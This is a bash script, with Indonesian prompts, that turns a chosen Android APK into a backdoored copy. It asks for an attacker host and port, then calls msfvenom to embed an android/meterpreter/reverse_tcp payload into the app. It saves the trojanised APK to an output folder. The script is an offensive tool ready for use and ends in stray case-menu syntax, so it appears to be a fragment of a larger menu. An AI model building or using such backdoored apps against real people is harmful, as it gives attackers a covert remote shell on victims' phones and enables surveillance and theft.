#!/bin/bash
#colors
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
unset LD_PRELOAD
tanya="Masukkan pilihan atau 'x' untuk keluar"
esit="kamu yakin ? tekan ENTER to exit"
return="ENTER to return to penetration revolution"
dir=modules
success=terinject
echo -e "$red [*]$yellow        Script Create By Mrcakil version 1.0"
echo -e "$red [*]$yellow        note * "
echo -e "$red [*]$yellow        script working use apktool version 2.4.1-dirty"
echo -e "$red [*]$yellow        Pastikan, Metasploit diinstal"
echo -e "$red [*]$yellow        Harap pertama-tama pindahkan atau salin file apk target Anda ke folder inject"
if [ ! -d $dir/inject ]
        then
                mkdir $dir/inject
                fi
echo -e "$cyan [*] Waiting..... !!!"
cd $dir/inject
ls | cat -n
read -p "$tanya >> " choice;
if [[ $choice == '' ]];
   then
                echo -e "$red Kamu Belum Milih :("
                exit
                fi
if [[ $choice == 'x' ]] ;
 then
echo -e "$red $esit"
read jaiho
exit
else
OUTPUT=`ls | sed -n $choice'p'`
#mv $dir/modules/inject/$OUTPUT $HOME/metasploit-framework
echo -e "$lightgreen "
read -p "masukan host : " lhost;
read -p "masukan port : " lport;
read -p "[*] MASUKKAN NAMA output YANG ANDA INGINKAN UNTUK : "  output12;
echo
echo -e "$red[*] Please wait .... $lightgreen"
echo
#cd $HOME/metasploit-framework
msfvenom -x $OUTPUT -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> $output12.apk
echo -e "$cyan[*]$yellow memindahkan apk file ke directory folder modules/terinject"
sleep 3
cd ..
mv inject/$output12.apk $success
echo -e "$cyan[*]$yellow Successfull"
fi

echo -e "$blue press ENTER for main menu$reset"
read continued
exit
;;
esac
